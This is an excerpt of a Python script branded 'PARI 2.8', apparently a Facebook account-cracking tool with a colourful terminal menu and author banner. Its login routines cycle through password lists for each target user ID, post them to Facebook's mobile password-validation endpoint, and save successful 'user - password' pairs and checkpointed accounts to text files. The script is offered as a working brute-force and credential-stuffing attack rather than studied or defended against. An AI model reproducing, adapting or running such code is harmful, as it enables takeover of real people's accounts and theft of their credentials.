...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO PARI 2.8     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
	...
	if Adi in ('3', '03'):
		os.system("xdg-open https://www.facebook.com/groups/584883109958879/?ref=share_group_link")
	if Adi in ('0', '00'):
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mPari-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPari\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mHEDI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('HEDI_Ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;31mHEDI-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
class load:
	def __init__(self):
		...
		for t in range(int("1")):
			...
			time.sleep(0.1)
		print('\n')
banner = """          _______  _______  _______ _________
(  ____ )(  ___  )(  ____ )\__   __/
| (    )|| (   ) || (    )|   ) (   
| (____)|| (___) || (____)|   | |   
|  _____)|  ___  ||     __)   | |   
...
|/       |/     \||/   \__/\_______/
=================================================
    [-] AUTHOR    :\033[1;32m Pari
    [-] GITHUB    :\033[1;32m Ayeshapari
    [-] WhatsApp  :\033[1;32m 0335*****
